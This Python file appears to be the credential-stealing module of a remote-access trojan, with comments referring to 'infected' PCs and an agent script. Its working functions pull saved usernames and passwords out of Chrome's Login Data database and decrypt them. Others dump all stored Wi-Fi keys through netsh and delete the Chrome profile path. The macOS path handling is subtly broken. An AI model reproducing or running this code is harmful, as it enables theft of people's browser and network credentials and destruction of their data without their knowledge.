import os
import sqlite3
import platform
import subprocess
try:
    import win32crypt
except:
    pass


def getPath():
    path = ''
    if os.name == 'nt':  # Windows
        path = os.getenv('localappdata') + \
               '\\Google\\Chrome\\User Data\\Default\\'
    elif os.name == 'posix':
        path = os.getenv('HOME')
        if platform.system() == 'darwin':  # MacOS
            path += 'Library/Application Support/Google/Chrome/Default'
        else:  # Linux
            path += '/.config/google-chrome/Default/'

    return path


# TODO: Currently only works for infected Windows PC's
def getChromePasswords():
    info_list = []
    path = getPath()

    try:
        connection = sqlite3.connect(path + 'Login Data')
        with connection:
            cursor = connection.cursor()
            v = cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()

        for website_url, username, password in value:
            if os.name == 'nt':
                password = win32crypt.CryptUnprotectData(
                        password, None, None, None, 0)[1]

            if password:
                info_list.append({
                    'website_url': website_url,
                    'username': username,
                    'password': str(password)
                })

        return info_list
    except Exception as e:
        return [{"error": str(e)}, {"Problem": "User doesn't use Google Chrome or isn't using Windows"}]


def deleteChromePasswords():
    path = getPath()
    os.remove(path)
    return

def getWifiPasswords():
    if os.name == 'nt':
        try:
            data_list = []
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

            for i in profiles:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(
                        'utf-8').split('\n')
                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                try:
                    data_list.append("{:<30}|  {:<}".format(i, results[0]))
                except Exception:
                    data_list.append("{:<30}|  {:<}".format(i, ""))

            return data_list
        except Exception as e:
            return ["getWifiPasswords failed with exception " + str(e)]
    else:
        return ['Infected PC is not Windows based, so cannot fetch wifi data for now.']

def getFirefoxPasswords():
    # TODO: getFirefoxPasswords() and create command in agent.py
    return [{'TODO': 'getFirefoxPasswords'}]

